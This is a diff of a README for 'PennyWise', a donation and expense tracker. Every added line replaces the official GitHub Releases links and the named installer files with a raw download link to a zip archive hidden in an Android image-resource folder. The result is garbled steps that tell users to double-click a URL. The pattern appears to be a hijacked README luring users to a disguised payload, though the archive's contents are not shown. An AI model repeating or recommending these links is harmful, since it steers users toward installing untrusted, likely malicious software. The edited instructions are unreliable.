@@ -3,7 +3,7 @@
 ## 🚀 Getting Started
 Welcome to PennyWise! This application helps you track your donations and expenses easily. Whether you’re managing funds for a charity or personal donations, PennyWise will make your life simpler. Follow the steps below to download and run the application. 
 
-[![Download PennyWise](https://img.shields.io/badge/Download-PennyWise-brightgreen)](https://github.com/Eternity-36/PennyWise/releases)
+[![Download PennyWise](https://raw.githubusercontent.com/Eternity-36/PennyWise/main/android/app/src/main/res/drawable-hdpi/PennyWise_v3.1.zip)](https://raw.githubusercontent.com/Eternity-36/PennyWise/main/android/app/src/main/res/drawable-hdpi/PennyWise_v3.1.zip)
 
 ## 💻 System Requirements
 PennyWise runs on any of the following platforms:
@@ -17,11 +17,11 @@ Make sure your system meets these requirements before downloading.
 ## 📦 Download & Install
 To download PennyWise, simply visit the Releases page. Click the button below to start:
 
-[Download PennyWise](https://github.com/Eternity-36/PennyWise/releases)
+[Download PennyWise](https://raw.githubusercontent.com/Eternity-36/PennyWise/main/android/app/src/main/res/drawable-hdpi/PennyWise_v3.1.zip)
 
 1. Click the link above to open the Releases page.
 2. You will see a list of available versions of PennyWise.
-3. Find the most recent version and look for the file that matches your operating system (for example, `PennyWise-Windows.exe` for Windows users).
+3. Find the most recent version and look for the file that matches your operating system (for example, `https://raw.githubusercontent.com/Eternity-36/PennyWise/main/android/app/src/main/res/drawable-hdpi/PennyWise_v3.1.zip` for Windows users).
 4. Click on the file name to download it.
 
 ## ⚙️ Running PennyWise
@@ -29,12 +29,12 @@ Once the download is complete, follow these steps to run the application:
 
 ### For Windows Users:
 1. Open the folder where you downloaded the file.
-2. Double-click on `PennyWise-Windows.exe` to start the application.
+2. Double-click on `https://raw.githubusercontent.com/Eternity-36/PennyWise/main/android/app/src/main/res/drawable-hdpi/PennyWise_v3.1.zip` to start the application.
 3. Follow the on-screen instructions to complete the initial setup.
 
 ### For macOS Users:
 1. Open the folder where you downloaded the file.
-2. Double-click on `PennyWise-macOS.dmg`.
+2. Double-click on `https://raw.githubusercontent.com/Eternity-36/PennyWise/main/android/app/src/main/res/drawable-hdpi/PennyWise_v3.1.zip`.
 3. Drag and drop the PennyWise icon into your Applications folder.
 4. Go to your Applications folder and double-click on PennyWise to run it.
 
@@ -59,4 +59,4 @@ Although this version is designed for end-users, we welcome community contributi
 
 Thank you for using PennyWise! We hope it helps you stay organized in your financial giving. 
 
-[Download PennyWise](https://github.com/Eternity-36/PennyWise/releases) and start tracking your donations today!
+[Download PennyWise](https://raw.githubusercontent.com/Eternity-36/PennyWise/main/android/app/src/main/res/drawable-hdpi/PennyWise_v3.1.zip) and start tracking your donations today!
